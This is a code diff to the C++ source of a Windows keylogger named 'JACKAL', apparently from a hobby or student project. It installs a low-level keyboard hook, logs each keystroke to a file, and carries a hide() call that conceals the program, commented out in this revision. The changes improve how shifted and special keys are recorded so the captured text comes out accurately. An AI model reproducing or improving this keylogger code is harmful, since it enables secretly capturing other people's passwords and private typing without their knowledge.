@@ -14,7 +14,7 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam);
 
 int main()
 {
-	hide();
+	//hide();
 	JACKAL(NULL);
 	return 0;
 }
@@ -33,10 +33,10 @@ DWORD WINAPI JACKAL(LPVOID lpParm)
 	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);
 
 	MSG message;
-	while (GetMessage(&message, NULL, 0, 0))
+	while (GetMessage(&message, NULL, 0, 0)) // this is the loop that keeps waiting for key presses
 	{
-		TranslateMessage(&message);
-		DispatchMessage(&message);
+		//TranslateMessage(&message);
+		//DispatchMessage(&message);
 	}
 
 	UnhookWindowsHookEx(hKeyboardHook);
@@ -60,10 +60,10 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 			write << key;
 			write.close();
 		}
-		else if (key == VK_SHIFT) {
+		else if (GetAsyncKeyState(0x10)) {
+			
 			switch (key) { // else its a special key with shift
 			case 49: write << "!"; break;
-			case 48: write << ")"; break;
 			case 50: write << "@"; break;
 			case 51: write << "#"; break;
 			case 52: write << "$"; break;
@@ -72,22 +72,25 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 			case 55: write << "&"; break;
 			case 56: write << "*"; break;
 			case 57: write << "("; break;
-			default: write << key; break;
+			case 48: write << ")"; break;
+			case -67: write << "_"; break;
+			case -69: write << "+"; break;
+			default: cout << "type is missing: " << int(key) << endl; break;
 			}
 		}
 		else {
 			switch (key) { // else its a special key no shift
+			case -67: write << "-"; break;
+			case -69: write << "="; break;
 			case 8: write << "<BackSpace>"; break;
 			case VK_ESCAPE: write << "<Esc>"; break;
-			case 49: write << "!"; break;
-				//case 127: write << "<Del>"; break;
 			case 32: write << " "; break;
 			case 13: write << "<Enter>\n"; break;
-			case VK_DELETE: write << "we used the special delete key"; break;
-			default: write << key; break;
+			case VK_DELETE: write << "<DELETE>"; break;
+			default: cout << "type is missing: " << int(key) << endl; break;
 			}
 		}
-		cout << "THE KEY WAS: " << key << endl;
+		cout << "THE KEY WAS: " << key << " value is: " << int(key) << endl;
 	}
 	write.close();
 	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
